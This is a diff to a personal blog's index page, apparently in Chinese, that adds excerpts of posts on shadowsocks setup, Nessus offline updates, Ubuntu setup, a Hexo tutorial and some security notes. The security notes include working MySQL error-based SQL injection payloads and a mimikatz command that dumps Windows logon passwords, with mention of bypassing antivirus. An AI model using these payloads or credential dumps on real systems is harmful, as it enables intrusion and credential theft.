@@ -163,15 +163,148 @@ classes that you can use:
     <li>
 
       <h2 class="post-list__post-title post-title">
-        <a href="/2018/01/24/hello-world/" title="link to Hello World">Hello World</a>
+        <a href="/2017/02/22/ubuntu下使用ss/" title="link to ubuntu下使用ss">ubuntu下使用ss</a>
       </h2>
 
       <div class="post-list__meta">
 
-        <time datetime="2018-01-24" class="post-list__meta--date date">2018-01-24</time> 
+        <time datetime="2017-02-22" class="post-list__meta--date date">2017-02-22</time> 
       </div>
 
       <div class="excerpt">
+        
+          <h2 id="命令行程序"><a href="#命令行程序" class="headerlink" title="命令行程序"></a>命令行程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install shadowsocks</span><br></pre></td></tr></table></figure>
+<p>新建个文件shadowsocks.json<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"server"</span>:<span class="string">"11.22.33.44"</span>,</span><br><span class="line"><span class="string">"server_port"</span>:50003,</span><br><span class="line"><span class="string">"local_port"</span>:1080,</span><br><span class="line"><span class="string">"password"</span>:<span class="string">"123456"</span>,</span><br><span class="line"><span class="string">"timeout"</span>:600,</span><br><span class="line"><span class="string">"method"</span>:<span class="string">"aes-256-cfb"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2017/02/22/linux下nessus离线更新/" title="link to linux下nessus离线更新">linux下nessus离线更新</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2017-02-22" class="post-list__meta--date date">2017-02-22</time> 
+      </div>
+
+      <div class="excerpt">
+        
+          <h2 id="获得Challenge-Code"><a href="#获得Challenge-Code" class="headerlink" title="获得Challenge Code"></a>获得Challenge Code</h2><p>先获取自己的Challenge Code</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jeffzhang@ubuntu:~$ sudo /opt/nessus/sbin/nessuscli fetch --challenge</span><br><span class="line">+ Challenge code: c619b40c78d630f88105b70def4a3393cbac07d8</span><br><span class="line">You can copy the challenge code above and paste it alongside your</span><br><span class="line">Activation Code at:</span><br><span class="line">https://plugins.nessus.org/v2/offline.php</span><br></pre></td></tr></table></figure>
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2017/02/22/ubuntu安装后/" title="link to ubuntu安装好后">ubuntu安装好后</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2017-02-22" class="post-list__meta--date date">2017-02-22</time> 
+      </div>
+
+      <div class="excerpt">
+        
+          <h2 id="系统清理更新"><a href="#系统清理更新" class="headerlink" title="系统清理更新"></a>系统清理更新</h2><p>安装完系统之后，需要更新一些补丁。Ctrl+Alt+T调出终端，执行一下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update </span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure></p>
+<h3 id="卸载libreOffice"><a href="#卸载libreOffice" class="headerlink" title="卸载libreOffice"></a>卸载libreOffice</h3><p>libreoffice事ubuntu自带的开源office软件，体验效果不如windows上的office，于是选择用WPS来替代（wps的安装后面会提到）<br>
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2017/01/20/ubuntu搭建ss服务/" title="link to ubuntu搭建ss服务">ubuntu搭建ss服务</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2017-01-20" class="post-list__meta--date date">2017-01-20</time> 
+      </div>
+
+      <div class="excerpt">
+        
+          <p>ubuntu下搭建ss服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure>
+<p>然后有俩种启动方式</p>
+<h3 id="1-命令行启动"><a href="#1-命令行启动" class="headerlink" title="1.命令行启动"></a>1.命令行启动</h3>
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2016/12/29/mysql显错注入/" title="link to mysql显错注入">mysql显错注入</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2016-12-29" class="post-list__meta--date date">2016-12-29</time> 
+      </div>
+
+      <div class="excerpt">
+        
+          <h3 id="1、通过floor暴错"><a href="#1、通过floor暴错" class="headerlink" title="1、通过floor暴错"></a>1、通过floor暴错</h3><p>/<em>数据库版本</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+/*简单办法暴库*/
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=info()</span><br></pre></td></tr></table></figure><br>/<em>连接用户</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+/*连接数据库*/
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2016/12/28/minikatz绕过杀软/" title="link to minikatz">minikatz</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2016-12-28" class="post-list__meta--date date">2016-12-28</time> 
+      </div>
+
+      <div class="excerpt">
+        
+          <h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span> &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
+<p>minikatz具有绕过杀软dump用户密码的能力</p>
+<h3 id="绕过杀软"><a href="#绕过杀软" class="headerlink" title="绕过杀软"></a>绕过杀软</h3>
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2016/12/15/使用hexo-Github搭建个人博客教程/" title="link to 使用hexo+Github搭建个人博客教程">使用hexo+Github搭建个人博客教程</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2016-12-15" class="post-list__meta--date date">2016-12-15</time> 
+      </div>
+
+      <div class="excerpt">
+        
+          感谢k3vi大神帮助，此文转自http://www.k3vi.xyz
         
       </div>
 
@@ -221,6 +354,10 @@ classes that you can use:
     
     
     
+
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+
     <!--kill ie6 -->
 <!--[if IE 6]>
   <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
